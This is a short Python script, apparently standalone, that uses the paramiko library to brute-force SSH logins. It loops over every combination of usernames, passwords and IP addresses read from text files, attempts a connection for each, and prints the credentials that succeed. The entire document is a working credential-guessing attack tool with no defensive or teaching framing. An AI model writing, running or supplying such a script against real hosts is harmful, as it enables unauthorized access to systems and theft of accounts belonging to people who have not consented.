import paramiko

# Load usernames, passwords, and IP addresses from files
with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

with open('ip_addresses.txt', 'r') as f:
    ip_addresses = f.read().splitlines()

# Loop through all combinations of usernames, passwords, and IP addresses
for username in usernames:
    for password in passwords:
        for ip_address in ip_addresses:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Attempt to connect with the given username, password, and IP address
            try:
                ssh.connect(ip_address, username=username, password=password)
                print(f'Successful login: username={username}, password={password}, ip_address={ip_address}')
            except paramiko.ssh_exception.AuthenticationException:
                # Failed login attempt - move on to the next combination
                continue
            finally:
                # Close SSH client
                ssh.close()



